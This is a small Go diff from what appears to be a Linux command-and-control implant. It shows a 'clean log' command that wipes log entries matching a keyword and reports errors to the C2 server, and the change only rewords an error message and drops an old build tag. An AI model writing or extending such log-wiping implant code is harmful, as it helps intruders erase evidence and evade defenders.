@@ -1,5 +1,4 @@
 //go:build linux
-// +build linux
 
 package handler
 
@@ -27,7 +26,7 @@ func platformCommands(cmd *cobra.Command) {
 func runCleanLogLinux(cmd *cobra.Command, args []string) {
 	keyword, _ := cmd.Flags().GetString("keyword")
 	if keyword == "" {
-		c2transport.NotifyC2(cmd, "%s", "Error: args error")
+		c2transport.NotifyC2(cmd, "Error: args error: keyword is required: %s", args)
 		return
 	}
 	err := modules.CleanAllByKeyword(keyword)
